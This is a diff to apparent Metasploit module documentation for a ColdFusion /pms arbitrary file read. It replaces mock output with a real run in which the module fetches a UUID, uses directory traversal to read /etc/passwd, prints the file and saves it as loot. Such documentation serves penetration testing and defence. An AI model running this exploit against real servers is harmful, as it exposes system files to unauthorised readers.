@@ -18,30 +18,42 @@ UUID attackers can hit the /pms endpoint in order to exploit the Arbitrary File 
 1. Receive the contents of the `FILE_PATH` file 
 
 ## Scenarios
-### Mock Python Server (not actually running ColdFusion)
+### ColdFusion Version 2023.0.0.330468 running on Linux
 
-#TODO: Update this with output from a real ColdFusion target 
 ```
-msf6 auxiliary(gather/coldfusion_pms_servlet_file_read) > rexploit
+msf6 auxiliary(gather/coldfusion_pms_servlet_file_read) > run
 [*] Reloading module...
 [*] Running module against 127.0.0.1
 
 [*] Attempting to retrieve UUID ...
-[+] UUID found:
-1c49c29a-f1c0-4ed0-9f9e-215f434c8a12
-[*] Attempting to exploit directory traversal to read /tmp/test
+[+] UUID found: 1c49c29a-f1c0-4ed0-9f9e-215f434c8a12
+[*] Attempting to exploit directory traversal to read /etc/passwd
 [+] File content:
-[
-  null,
-  root:x:0:0:root:/root:/bin/bash,
-  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin,
-  bin:x:2:2:bin:/bin:/usr/sbin/nologin,
-  sys:x:3:3:sys:/dev:/usr/sbin/nologin,
-  sync:x:4:65534:sync:/bin:/bin/sync,
-  games:x:5:60:games:/usr/games:/usr/sbin/nologin,
-  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin,
-  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin,
-  ]
+n00tmeg:x:1000:1000:n00tmeg,,,:/home/n00tmeg:/bin/bash
+hplip:x:127:7:HPLIP system user,,,:/run/hplip:/bin/false
+pulse:x:125:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+colord:x:123:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+nm-openvpn:x:121:127:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+whoopsie:x:117:124::/nonexistent:/bin/false
+cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
+uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
 [+] Results saved to: /Users/jheysel/.msf4/loot/20240403192500_default_127.0.0.1_coldfusion.file_475871.txt
 [*] Auxiliary module execution completed
 ```
